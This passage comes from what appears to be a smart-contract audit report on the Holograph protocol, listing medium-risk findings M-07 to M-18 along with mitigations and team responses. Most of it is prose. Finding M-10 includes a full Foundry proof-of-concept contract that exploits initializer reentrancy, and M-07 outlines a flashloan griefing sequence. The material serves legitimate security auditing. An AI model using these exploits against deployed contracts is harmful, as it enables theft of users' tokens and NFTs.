1.  bondUtilityToken(attacker, large_amount, high_pod_number)
2.  unbondUtilityToken(attacker, attacker)

The above could be wrapped in a flashloan to get virtually any pod tier filled.

The consequence is that when the scheduler chooses pods uniformally, they will very likely choose an empty pod, with the zero address. Therefore, the chosen operator will be 0, which is referred to in the code as "open season". In this occurrance, any operator can perform the executeJob() call. This is of course really bad, because all but one operator continually waste gas for executions that will be reverted after the lucky first transaction goes through. This would be a practical example of a griefing attack on Holograph.

### Impact

Any user can force chaotic "open season" operator behavior

### Recommended Mitigation Steps

It is important to pay special attention to the scheduling algorithm, to make sure different pods are given execution time according to the desired heuristics.

**[ACC01ADE (Holograph) confirmed and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/432#issuecomment-1308891591):**
 > Good catch. This will be updated to mitigate.



***

## [[M-08] `_payoutEth()` calculates `balance` with an offset, always leaving dust `ETH` in the contract](https://github.com/code-423n4/2022-10-holograph-findings/issues/476)
*Submitted by joestakey, also found by Aymen0909, d3e4, Jeiwan, joestakey, and Trust*

[PA1D.sol#L391](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/PA1D.sol#L391)<br>
[PA1D.sol#L395](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/PA1D.sol#L395)<br>

Payout recipients can call `getEthPayout()` to transfer the ETH balance of the contract to all payout recipients.<br>
This function makes an internal call to `_payoutEth`, which sends the payment to the recipients based on their associated `bp`.

The issue is that the `balance` used in the `transfer` calls is not the contract ETH balance, but the balance minus a `gasCost`.

This means `getEthPayout()` calls will leave dust in the contract.

### Impact

If the dust is small enough, a subsequent call to `getEthPayout` is likely to revert because of [this check](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/PA1D.sol#L390).<br>
And `enforcer/PA1D` does not have any other ETH withdrawal function. While `enforcer/PA1D` is meant to be used via delegate calls from a NFT collection contract, if the NFT contract does not have any withdrawal function either, this dust mentioned above is effectively lost.

### Proof of Concept

Let us take the example of a payout recipient trying to retrieve their share of the balance, equal to `40_000` For simplicity, assume one payout address, owned by Alice:

*   Alice calls `getEthPayout()`, which in turn calls `_payoutEth()`
*   `gasCost = (23300 * length) + length = 23300 + 1 = 23301`
*   `balance = address(this).balance = 40000`
*   `balance - gasCost = 40000 - 23301 = 16699`,
*   `sending = ((bps[i] * balance) / 10000) = 10000 * 16699 / 10000 = 16699`
*   Alice receives `16699`.

Alice has to wait for the balance to increase to call `getEthPayout()` again. But no matter what, there will always be at least a dust of `10000` left in the contract.

### Recommended Mitigation Steps

The transfers should be done based on `address(this).balance`. The `gasCost` is redundant as the gas amount is specified by the caller of `getEthPayout()`, the contract does not have to provide gas.

```diff
-391: balance = balance - gasCost;
392:     uint256 sending;
393:     // uint256 sent;
394:     for (uint256 i = 0; i < length; i++) {
395:       sending = ((bps[i] * balance) / 10000);
396:       addresses[i].transfer(sending);
397:       // sent = sent + sending;
398:     }
```

**[gzeon (judge) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/476#issuecomment-1294771534):**
 > I think this is intended, a bit weird why 23300 is chosen, why gas price is not considered and why the withheld fund is not sent to the caller tho. Related to [`#164`](https://github.com/code-423n4/2022-10-holograph-findings/issues/164) and [`#106`](https://github.com/code-423n4/2022-10-holograph-findings/issues/106)

**[Trust (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/476#issuecomment-1294789604):**
 > It doesn't make sense that it's intentional, because gas is never provided by contract, only EOA. Contract can only relay gas passed to it. But interesting to hear what the team says.

**[gzeon (judge) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/476#issuecomment-1294821170):**
 > Agreed, but still seems to be low risk.

**[alexanderattar (Holograph) confirmed and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/476#issuecomment-1307929686):**
 > This is a valid issue and this function will be refactored.

**[alexanderattar (Holograph) linked a PR](https://github.com/code-423n4/2022-10-holograph-findings/issues/476#ref-pullrequest-1469977783):**
 > [Feature/holo 612 royalty smart contract improvements](https://github.com/holographxyz/holograph-protocol/pull/93)



***

## [[M-09] `HolographERC20` breaks composability by forcing usage of draft proposal EIP-4524](https://github.com/code-423n4/2022-10-holograph-findings/issues/440)
*Submitted by Trust*

[HolographERC20.sol#L539](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC20.sol#L539)<br>

HolographERC20 is the ERC20 enforcer for Holograph. In  the safeTransferFrom operation, it calls \_checkOnERC20Received:

    if (_isEventRegistered(HolographERC20Event.beforeSafeTransfer)) {
      require(SourceERC20().beforeSafeTransfer(account, recipient, amount, data));
    }
    _transfer(account, recipient, amount);
    require(_checkOnERC20Received(account, recipient, amount, data), "ERC20: non ERC20Receiver");
    if (_isEventRegistered(HolographERC20Event.afterSafeTransfer)) {
      require(SourceERC20().afterSafeTransfer(account, recipient, amount, data));
    }

The checkOnERC20Received function:

    if (_isContract(recipient)) {
      try ERC165(recipient).supportsInterface(ERC165.supportsInterface.selector) returns (bool erc165support) {
        require(erc165support, "ERC20: no ERC165 support");
        // we have erc165 support
        if (ERC165(recipient).supportsInterface(0x534f5876)) {
          // we have eip-4524 support
          try ERC20Receiver(recipient).onERC20Received(address(this), account, amount, data) returns (bytes4 retv
            return retval == ERC20Receiver.onERC20Received.selector;
          } catch (bytes memory reason) {
            if (reason.length == 0) {
              revert("ERC20: non ERC20Receiver");
            } else {
              assembly {
                revert(add(32, reason), mload(reason))
              }
            }
          }
        } else {
          revert("ERC20: eip-4524 not supported");
        }
      } catch (bytes memory reason) {
        if (reason.length == 0) {
          revert("ERC20: no ERC165 support");
        } else {
          assembly {
            revert(add(32, reason), mload(reason))
          }
        }
      }
    } else {
      return true;
    }

In essence, if the target is a contract, the enforcer requires it to fully implement EIP-4524. The problem is that [this](https://eips.ethereum.org/EIPS/eip-4524) EIP is just a draft proposal, which the project cannot assume to be supported by any receiver contract, and definitely not every receiver contract.

The specs warn us:

```
⚠️ This EIP is not recommended for general use or implementation as it is likely to change.

```

Therefore, it is a very dangerous requirement to add in an ERC20 enforcer, and must be left to the implementation to do if it so desires.

### Impact

ERC20s enforced by HolographERC20 are completely uncomposable. They cannot be used for almost any DeFi application, making it basically useless.

### Recommended Mitigation Steps

Remove the EIP-4524 requirements altogether.

**[gzeon (judge) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/440#issuecomment-1297240122):**
 > Low risk unless this is not a design decision.

**[alexanderattar (Holograph) confirmed and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/440#issuecomment-1306639824):**
 > Originally a design choice, but it can be updated to not revert if the EIP is not supported.

**[Trust (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/440#issuecomment-1306719396):**
 > Will argue that philosophically any code is originally a design choice. If it's later made clear the choice has unintended dire consequences then the finding should not be penalized because of that alone. 

**[ACC01ADE (Holograph) linked a PR](https://github.com/code-423n4/2022-10-holograph-findings/issues/440#ref-pullrequest-1452472274):**
 > [Feature/HOLO-605: C4 medium risk fixes](https://github.com/holographxyz/holograph-protocol/pull/88)



***

## [[M-10] Holographable tokens can be reinitialized](https://github.com/code-423n4/2022-10-holograph-findings/issues/215)
*Submitted by securerodd*

When new holographable tokens are created, they typically set a state variable that holds the address of the holograph contract. When creation is done through the `HolographFactory`, the holograph contract is [passed in as a parameter](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographFactory.sol#L252) to the holographable contract's initializer function. Under normal circumstances, this would ensure that the hologrpahable asset stores a trusted holograph contract address in its `_holographSlot`.

However, the initializer is vulnerable to reentrancy and the `_holographSlot` can be set to an untrusted contract address. This occurs because before the initialization is complete, the Holographer makes a [delegate call](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/Holographer.sol#L162-L164) to a corresponding enforcer contract. From here, the enforcer contract makes an [optional call](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC20.sol#L241) to the source contract in an attempt to intialize it. This call can be used to reenter into the Holographer contract's initialize function before the first one has been completed and overwrite key variables such as the `_adminslot`, the `_holographSlot` and the `_sourceContractSlot`.

One way in which this becomes problematic is because of how holographed ERC20s perform `transferFrom` calls. Holographed ERC20s by default allow two special addresses to [transfer](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC20.sol#L527) assets on behalf of other users without an allowance. These addresses are calculated by calling `_holograph().getBridge()` and `_holograph().getOperator()` respectively. With the above described reentrancy issue, `_holograph().getBridge()` and `_holograph().getOperator()` can return arbitrary addresses. This means that newly created holographed ERC20 tokens can be prone to unauthorized transfers. These assets will have been deployed by the HolographFactory and may look and feel like a safe holographable token to users but they can come with a built-in rugpull vector.

### Proof of Concept:

    // SPDX-License-Identifier: UNLICENSED
    pragma solidity ^0.8.13;

    import "forge-std/Test.sol";
    import "../contracts/HolographFactory.sol";
    import "../contracts/HolographRegistry.sol";
    import "../contracts/Holograph.sol";
    import "../contracts/enforcer/HolographERC20.sol";

    //Contract used to show reentrancy in initializer
    contract SourceContract {
        address public holographer;
        MockContract public mc;

        constructor() {
             mc = new MockContract();
        }

        //function that reenters the holographer and sets this contract as the new holograph slot
        function init(bytes memory initPayload) external returns(bytes4) {
            assembly {
                sstore(holographer.slot, caller())
            }
            bytes memory initCode = abi.encode(abi.encode(uint32(1), address(this), bytes32("0xabc"), address(this)), bytes("0x0")); 
            holographer.call(abi.encodeWithSignature("init(bytes)", initCode));
            return InitializableInterface.init.selector;
        }

        function getRegistry() external view returns (address) {
            return address(this);
        }

        function getReservedContractTypeAddress(bytes32 contractType) external view returns (address) {
            return address(mc);
        }

        function isTheHolograph() external pure returns (bool) {
            return true;
        }

    }

    //simple extension contract to return easily during reinitialization
    contract MockContract {
        constructor() {}

        function init(bytes memory initPayload) external pure returns(bytes4) {
            return InitializableInterface.init.selector;
        }
    }

    contract HolographTest is Test {
        DeploymentConfig public config;
        Verification public verifiedSignature;
        HolographFactory public hf;
        HolographRegistry public hr;
        Holograph public h;
        HolographERC20 public he20;

        uint256 internal userPrivateKey;
        address internal hrAdmin;
        mapping(uint256 => bool) public _burnedTokens;
        address internal user;
        function setUp() public {
            //Creating all of the required objects
            hf = new HolographFactory();
            hr = new HolographRegistry();
            h = new Holograph();
            he20 = new HolographERC20();

            //Setting up the registry admin
            hrAdmin = vm.addr(100);

            //Creating factory, holograph, and registry init payloads
            bytes memory hfInitPayload = abi.encode(address(h), address(hr));
            hf.init(hfInitPayload);
            bytes memory hInitPayload = abi.encode(uint32(0),address(1),address(hf),address(1),address(1),address(hr),address(1),address(1));
            h.init(hInitPayload);
            bytes32[] memory reservedTypes = new bytes32[](1);
            reservedTypes[0] = "0xabc";
            bytes memory hrInitPayload = abi.encode(address(h), reservedTypes);

            //Setting up a contract type address for the ERC20 enforcer
            vm.startPrank(hrAdmin, hrAdmin);
            hr.init(hrInitPayload);
            hr.setContractTypeAddress(reservedTypes[0], address(he20));
            vm.stopPrank();

            //Keys used to sign transaction for deployment
            userPrivateKey = 0x1337;
            user = vm.addr(userPrivateKey);
        }

        function testDeployShadyHolographer() public {
            //setting up the configuration, contract type is not important
            config.contractType = "0xabc";
            config.chainType = 1;
            config.salt = "0x12345";
            config.byteCode = type(SourceContract).creationCode;
            bytes memory initCode = "0x123";

            //giving our token some semi-realistic metadata
            config.initCode = abi.encode("HToken", "HT", uint8(18), uint256(0), "HTdomainSeparator", "HTdomainVersion", false, initCode);

            //creating the hash for our user to sign
            bytes32 hash = keccak256(
                abi.encodePacked(
                    config.contractType,
                    config.chainType,
                    config.salt,
                    keccak256(config.byteCode),
                    keccak256(config.initCode),
                    user
                ));

            //signing the hash and creating the verified signature
            (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, hash);
            verifiedSignature.r = r;
            verifiedSignature.v = v;
            verifiedSignature.s = s;

            //deploying our new source contract and holographable contract pair
            hf.deployHolographableContract(config, verifiedSignature, user);

            //after the reentrancy has affected the initialization, we grab the holographer address from the registry
            address payable newHolographAsset = payable(hr.getHolographedHashAddress(hash));

            //verify that the _holographSlot in the holographer contract points to our SourceContract and not the trusted holograph contract
            assertEq(SourceContract(Holographer(newHolographAsset).getHolograph()).isTheHolograph(), true);
        }
    }

### Recommended Mitigation Steps

Consider checking whether the contract is in an "initializing" phase such as is done in OpenZeppelin's [`Initializable`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/a1948250ab8c441f6d327a65754cb20d2b1b4554/contracts/proxy/utils/Initializable.sol#L83) library to prevent reentrancy during initialization. Additionally, if the bridge and operators are not intended to transfer tokens directly, consider removing the logic that allows them to bypass the allowance requirements.

**[gzeon (judge) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/215#issuecomment-1295226137):**
 > I think the enforcer should be considered trusted so the risk here is low.

**[alexanderattar (Holograph) confirmed and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/215#issuecomment-1306712519):**
 > Good observation. `_setInitialized();` needs to be moved higher up the stack before the init call.

**[ACC01ADE (Holograph) linked a PR](https://github.com/code-423n4/2022-10-holograph-findings/issues/215#ref-pullrequest-1452472274):**
 > [Feature/HOLO-605: C4 medium risk fixes](https://github.com/holographxyz/holograph-protocol/pull/88)



***

## [[M-11] Source contract can steal NFTs from users](https://github.com/code-423n4/2022-10-holograph-findings/issues/290)
*Submitted by Jeiwan, also found by \_\_141345\_\_ and m9800*

A source contract can burn and transfer NFTs of users without their permission.

### Proof of Concept

Every Holographed ERC721 collection is paired with a source contract, which is the user created contract that's extended by the Holographed ERC721 contract ([HolographFactory.sol#L234-L246](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographFactory.sol#L234-L246)). A source contract, however, has excessive privileges in the Holographed ERC721. Specifically, it can burn and transfer users' NFTs without their approval ([HolographERC721.sol#L500](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC721.sol#L500), [HolographERC721.sol#L577](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC721.sol#L577)):

```solidity
function sourceBurn(uint256 tokenId) external onlySource {
  address wallet = _tokenOwner[tokenId];
  _burn(wallet, tokenId);
}

function sourceTransfer(address to, uint256 tokenId) external onlySource {
  address wallet = _tokenOwner[tokenId];
  _transferFrom(wallet, to, tokenId);
}
```

While this might be desirable for extensibility and flexibility, this puts users at the risk of being robbed by the source contract owner or a hacker who hacked the source contract owner's key.

### Recommended Mitigation Steps

Consider removing the `sourceBurn` and `sourceTransfer` functions of `HolographERC721` and requiring user approval to transfer or burn their tokens (`burn` and `safeTransferFrom` can be called by a source contract instead of `sourceBurn` and `sourceTransfer`).

**[gzeon (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/290#issuecomment-1297281122):**
 > Also [`#403`](https://github.com/code-423n4/2022-10-holograph-findings/issues/403) brought up that source contract can also steal NFTs from burn address.

**[alexanderattar (Holograph) confirmed and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/290#issuecomment-1306692944):**
 > Need to add a `require(!_burnedTokens[tokenId], "ERC721: token has been burned");` check to sourceTransfer function

**[alexanderattar (Holograph) resolved](https://github.com/code-423n4/2022-10-holograph-findings/issues/290#event-7817138955):**
 > [Feature/HOLO-604: implementing critical issue fixes](https://github.com/holographxyz/holograph-protocol/pull/84)



***

## [[M-12] Bond tokens (HLG) can get permanently stuck in operator](https://github.com/code-423n4/2022-10-holograph-findings/issues/322)
*Submitted by minhtrng, also found by arcoun, cccz, Chom, csanuragjain, ctf\_sec, Jeiwan, and Lambda*

[HolographOperator.sol#L374-L382](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L374-L382)<br>
[HolographOperator.sol#L849-L857](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L849-L857)<br>

Bond tokens (HLG) equal to the slash amount will get permanently stuck in the HolographOperator each time a job gets executed by someone who is not an (fallback-)operator.

### Proof of Concept

The `HolographOperator.executeJob` function can be executed by anyone after a certain passage of time:

```js
...
if (job.operator != address(0)) {
    ...
    if (job.operator != msg.sender) {
        //perform time and gas price check
        if (timeDifference < 6) {
            // check msg.sender == correct fallback operator
        }
        // slash primary operator
        uint256 amount = _getBaseBondAmount(pod);
        _bondedAmounts[job.operator] -= amount;
        _bondedAmounts[msg.sender] += amount;

        //determine if primary operator retains his job
        if (_bondedAmounts[job.operator] >= amount) {
            ...
        } else {
            ...
        }
    }
}
// execute the job
```

In case `if (timeDifference < 6) {` gets skipped, the slashed amount will be assigned to the `msg.sender` regardless if that sender is currently an operator or not. The problem lies within the fact that if `msg.sender` is not already an operator at the time of executing the job, he cannot become one after, to retrieve the reward he got for slashing the primary operator. This is because the function `HolographOperator.bondUtilityToken` requires `_bondedAmounts` to be 0 prior to bonding and hence becoming an operator:

```js
require(_bondedOperators[operator] == 0 && _bondedAmounts[operator] == 0, "HOLOGRAPH: operator is bonded");
```

### Recommended Mitigation Steps

Assuming that it is intentional that non-operators can execute jobs (which could make sense, so that a user could finish a bridging process on his own, if none of the operators are doing it): remove the requirement that `_bondedAmounts` need to be 0 prior to bonding and becoming an operator so that non-operators can get access to the slashing reward by unbonding after.

Alternatively (possibly preferrable), just add a method to withdraw any `_bondedAmounts` of non-operators.

**[alexanderattar (Holograph) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/322#issuecomment-1306682172):**
 > Known issue that already has been fixed for the next update.
>
> [Feature/HOLO-605: C4 medium risk fixes](https://github.com/holographxyz/holograph-protocol/pull/88)



***

## [[M-13] Implementation code does not align with the business requirement: Users are not charged with withdrawn fee when user unbound token in `HolographOperator.sol`](https://github.com/code-423n4/2022-10-holograph-findings/issues/142)
*Submitted by ladboy233*

[HolographOperator.sol#L899](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L899)<br>
[HolographOperator.sol#L920](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L920)<br>
[HolographOperator.sol#L924](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L924)<br>
[HolographOperator.sol#L928](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L928)<br>
[HolographOperator.sol#L932](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L932)<br>

When user call unbondUtilityToken to unstake the token, the function reads the available bonded amount, and transfers back to the operator.

<https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L899>

```solidity
/**
 * @dev get current bonded amount by operator
 */
uint256 amount = _bondedAmounts[operator];
/**
 * @dev unset operator bond amount before making a transfer
 */
_bondedAmounts[operator] = 0;
/**
 * @dev remove all operator references
 */
_popOperator(_bondedOperators[operator] - 1, _operatorPodIndex[operator]);
/**
 * @dev transfer tokens to recipient
 */
require(_utilityToken().transfer(recipient, amount), "HOLOGRAPH: token transfer failed");
```

the logic is clean, but does not conform to the buisness requirement in the documentation, the doc said

<https://docs.holograph.xyz/holograph-protocol/operator-network-specification#operator-job-selection>

> To move to a different pod, an Operator must withdraw and re-bond HLG. Operators who withdraw HLG will be charged a 0.1% fee, the proceeds of which will be burned or returned to the Treasury.

The charge 0.1% fee is not implemented in the code.

there are two incentive for bounded operator to stay,

the first is the reward incentive, the second is to avoid penalty with unbonding.

Without chargin the unstaking fee, the second incentive is weak and the operator can unbound or bond whenver they want

### Proof of Concept

<https://docs.holograph.xyz/holograph-protocol/operator-network-specification#operator-job-selection>

### Recommended Mitigation Steps

We recommend charge the 0.1% unstaking fee to make the code align with the busienss requirement in the doc.

```solidity
/**
 * @dev get current bonded amount by operator
 */
uint256 amount = _bondedAmounts[operator];
uint256 fee = chargedFee(amount); // here
amount -= fee;  
/**
 * @dev unset operator bond amount before making a transfer
 */
_bondedAmounts[operator] = 0;
/**
 * @dev remove all operator references
 */
_popOperator(_bondedOperators[operator] - 1, _operatorPodIndex[operator]);
/**
 * @dev transfer tokens to recipient
 */
require(_utilityToken().transfer(recipient, amount), "HOLOGRAPH: token transfer failed");
```

**[alexanderattar (Holograph) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/142#issuecomment-1307863427):**
 > This is true. The functionality is purposefully disabled for easier bonding/unbonding testing by team at the moment, but will be addressed in the upcoming release.

**[alexanderattar (Holograph) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/142#issuecomment-1351786887):**
 > On initial mainnet beta launch, Holograph will be operating as the sole operator on the network so this is not an immediate concern, but before the launch of the public operator network, the fee will be added via upgrade.



***

## [[M-14] PA1D#bidSharesForToken returns incorrect `bidShares.creator.value`](https://github.com/code-423n4/2022-10-holograph-findings/issues/180)
*Submitted by 0x52*

[PA1D.sol#L665-L675](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/PA1D.sol#L665-L675)<br>

`bidShares` returned are incorrect leading to incorrect royalties.

### Proof of Concept

[Zora Market](https://etherscan.io/address/0xe5bfab544eca83849c53464f85b7164375bdaac1#code#F1#L113)

    function isValidBidShares(BidShares memory bidShares)
        public
        pure
        override
        returns (bool)
    {
        return
            bidShares.creator.value.add(bidShares.owner.value).add(
                bidShares.prevOwner.value
            ) == uint256(100).mul(Decimal.BASE);
    }

Above you can see the Zora market lines that validate bidShares, which shows that Zora market bidShare.values should be percentages written out to 18 decimals. However PA1D#bidSharesForToken sets the bidShares.creator.value to the raw basis points set by the owner, which is many order of magnitudes different than expected.

### Recommended Mitigation Steps

To return the proper value, basis points returned need to be adjusted. Convert from basis points to percentage by dividing by 10 &ast;&ast; 2 (100) then scale to 18 decimals. The final result it to multiple the basis point by 10 &ast;&ast; (18 - 2) or 10 &ast;&ast; 16:

    function bidSharesForToken(uint256 tokenId) public view returns (ZoraBidShares memory bidShares) {
        // this information is outside of the scope of our
        bidShares.prevOwner.value = 0;
        bidShares.owner.value = 0;
        if (_getReceiver(tokenId) == address(0)) {
    -       bidShares.creator.value = _getDefaultBp();
    +       bidShares.creator.value = _getDefaultBp() * (10 ** 16);
        } else {
    -       bidShares.creator.value = _getBp(tokenId);
    +       bidShares.creator.value = _getBp(tokenId) * (10 ** 16);
        }
        return bidShares;
    }

**[alexanderattar (Holograph) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/180#issuecomment-1307823222):**
 > Good catch! We'll implement the suggested solution.

**[alexanderattar (Holograph) linked a PR](https://github.com/code-423n4/2022-10-holograph-findings/issues/180#ref-pullrequest-1469977783):**
 > [Feature/holo 612 royalty smart contract improvements](https://github.com/holographxyz/holograph-protocol/pull/93)



***

## [[M-15] `HolographERC721.safeTransferFrom` not compliant with EIP-721](https://github.com/code-423n4/2022-10-holograph-findings/issues/203)
*Submitted by Lambda*

[HolographERC721.sol#L366](https://github.com/code-423n4/2022-10-holograph/blob/24bc4d8dfeb6e4328d2c6291d20553b1d3eff00b/src/enforcer/HolographERC721.sol#L366)<br>

According to EIP-721, we have the following for `safeTransferFrom`:

```solidity
///  (...) When transfer is complete, this function
///  checks if `_to` is a smart contract (code size > 0). If so, it calls
///  `onERC721Received` on `_to` and throws if the return value is not
///  `bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"))`.
```

According to the specification, the function must therefore always call `onERC721Received`, not only when it has determined via ERC-165 that the contract provides this function. Note that in the EIP, the provided interface for `ERC721TokenReceiver` does not mention ERC-165. For the token itself, we have: `interface ERC721 /* is ERC165 */ {`<br>
However, for the receiver, the provided interface there is just: `interface ERC721TokenReceiver {`<br>
This leads to failed transfers when they should not fail, because many receivers will just implement the `onERC721Received` function (which is sufficient according to the EIP), and not `supportsInterface` for ERC-165 support.

### Proof Of Concept

Let's say a receiver just implements the `IERC721Receiver` from OpenZeppelin: <https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/IERC721Receiver.sol><br>
Like the provided interface in the EIP itself, this interface does not derive from EIP-165. All of these receivers (which are most receivers in practice) will not be able to receive those tokens, because the `require` statement (that checks for ERC-165 support) reverts.

### Recommended Mitigation Steps

Remove the ERC-165 check in the `require` statement (like OpenZeppelin does: <https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L436>).

**[alexanderattar (Holograph) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/203#issuecomment-1307809122):**
 > This will be updated to be fully ERC721 compliant

**[ACC01ADE (Holograph) linked a PR](https://github.com/code-423n4/2022-10-holograph-findings/issues/203#ref-pullrequest-1452472274):**
 > [Feature/HOLO-605: C4 medium risk fixes](https://github.com/holographxyz/holograph-protocol/pull/88)



***

## [[M-16] `ApprovalAll` event is missing parameters](https://github.com/code-423n4/2022-10-holograph-findings/issues/270)
*Submitted by bin2chen*

[HolographERC721.sol#L392](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/src/enforcer/HolographERC721.sol#L392)<br>

`beforeApprovalAll()` / `afterApprovalAll()` can only pass "to" and "approved", missing "owner", if contract listening to this event,but does not know who approve it, so can not react to this event.<br>
Basically, this event cannot be used.

### Proof of Concept

      function setApprovalForAll(address to, bool approved) external {
    ....

        if (_isEventRegistered(HolographERC721Event.beforeApprovalAll)) {
          require(SourceERC721().beforeApprovalAll(to, approved)); /***** only to/approved ,need owner
        }  

        _operatorApprovals[msg.sender][to] = approved;

        if (_isEventRegistered(HolographERC721Event.afterApprovalAll)) {
          require(SourceERC721().afterApprovalAll(to, approved)); /***** only to/approved ,need owner
        }
      }

### Recommended Mitigation Steps

Add parameter: owner

    interface HolographedERC721 {
    ...

    - function beforeApprovalAll(address _to, bool _approved) external returns (bool success);
    + function beforeApprovalAll(address owner, address _to, bool _approved) external returns (bool success);

    - function afterApprovalAll(address _to, bool _approved) external returns (bool success);
    + function afterApprovalAll(address owner, address _to, bool _approved) external returns (bool success);

<!---->

      function setApprovalForAll(address to, bool approved) external {

        if (_isEventRegistered(HolographERC721Event.beforeApprovalAll)) {
    -     require(SourceERC721().beforeApprovalAll(to, approved)); 
    +     require(SourceERC721().beforeApprovalAll(msg.sender,to, approved)); 
        }  

        _operatorApprovals[msg.sender][to] = approved;

        if (_isEventRegistered(HolographERC721Event.afterApprovalAll)) {
    -      require(SourceERC721().afterApprovalAll(to, approved));
    +      require(SourceERC721().afterApprovalAll(msg.sender,to, approved));
        }
      }

**[alexanderattar (Holograph) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/270#issuecomment-1306696158):**
 > Good catch. This will be updated so that `beforeApprovalAll` and `afterApprovalAll` passes in owner.

**[ACC01ADE (Holograph) linked a PR](https://github.com/code-423n4/2022-10-holograph-findings/issues/270#ref-pullrequest-1452472274):**
 > [Feature/HOLO-605: C4 medium risk fixes](https://github.com/holographxyz/holograph-protocol/pull/88)



***

## [[M-17] Wrong slashing calculation rewards for operator that did not do his job](https://github.com/code-423n4/2022-10-holograph-findings/issues/307)
*Submitted by peanuts, also found by ctf\_sec, imare, and Jeiwan*

Wrong slashing calculation may create unfair punishment for operators that accidentally forgot to execute their job.

### Proof of Concept

[Docs](https://docs.holograph.xyz/holograph-protocol/operator-network-specification): If an operator acts maliciously, a percentage of their bonded HLG will get slashed. Misbehavior includes (i) downtime, (ii) double-signing transactions, and (iii) abusing transaction speeds. 50% of the slashed HLG will be rewarded to the next operator to execute the transaction, and the remaining 50% will be burned or returned to the Treasury.

The docs also include a guide for the number of slashes and the percentage of bond slashed. However, in the contract, there is no slashing of percentage fees. Rather, the whole \_getBaseBondAmount() fee is [slashed from the job.operator instead.](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L374-L382)

            uint256 amount = _getBaseBondAmount(pod);
            /**
             * @dev select operator that failed to do the job, is slashed the pod base fee
             */
            _bondedAmounts[job.operator] -= amount;
            /**
             * @dev the slashed amount is sent to current operator
             */
            _bondedAmounts[msg.sender] += amount;

Documentation states that only a portion should be slashed and the number of slashes should be noted down.

### Recommended Mitigation Steps

Implement the correct percentage of slashing and include a mapping to note down the number of slashes that an operator has.

**[alexanderattar (Holograph) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/307#issuecomment-1306684590):**
 > Valid. The docs are not in sync with the code, but it will be adjusted to handle this correctly.

**[alexanderattar (Holograph) resolved and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/307#issuecomment-1351759231):**
 > We have changed the slashing logic to use base bonding amount instead of percentage based approach.



***

## [[M-18] Leak of value when interacting with an ERC721 enforcer contract](https://github.com/code-423n4/2022-10-holograph-findings/issues/468)
*Submitted by Trust*

[HolographERC721.sol#L962](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC721.sol#L962)<br>

HolographERC721.sol is an enforcer of the ERC721 standard. In its fallback function, it calls the actual implementation in order to handle additional logic.

